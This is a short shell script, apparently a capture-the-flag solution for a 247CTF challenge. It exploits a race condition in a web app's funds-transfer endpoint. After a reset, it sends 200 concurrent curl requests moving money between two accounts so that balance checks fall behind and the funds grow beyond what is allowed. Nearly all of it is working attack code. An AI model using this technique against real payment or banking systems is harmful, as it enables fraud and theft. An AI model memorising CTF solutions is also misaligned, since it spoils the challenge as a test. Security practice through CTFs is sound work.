#!/bin/sh

# NOTE: We abuse a race condition in the database to
#       transfer more funds than we are allowed to.
#       While the database is still calculating the
#       changes in the previous transaction, we are already
#       sending another request, and it doesn't update in
#       time to see that the funds changed.

ctf_url="https://873087eaf9deb9d5.247ctf.com"

echo "Reseting database..."
curl -X GET "${ctf_url}/?reset=y" > /dev/null 2>&1

echo "Abusing race condition in the database..."
for i in $(seq 5); do
	for i in $(seq 20); do
		curl -X GET "${ctf_url}/?from=1&to=2&amount=42" > /dev/null 2>&1 &
	done

	for i in $(seq 20); do
		curl -X GET "${ctf_url}/?from=2&to=1&amount=100" > /dev/null 2>&1 &
	done
done

echo "Waiting for requests to finish..."
echo "NOTE: It might take a couple of tries for this to work!"
echo "      Check '${ctf_url}/?dump=y' to verify that the funds have been increased"
while ps ax | grep curl | grep "$ctf_url" > /dev/null; do
	sleep 1
done
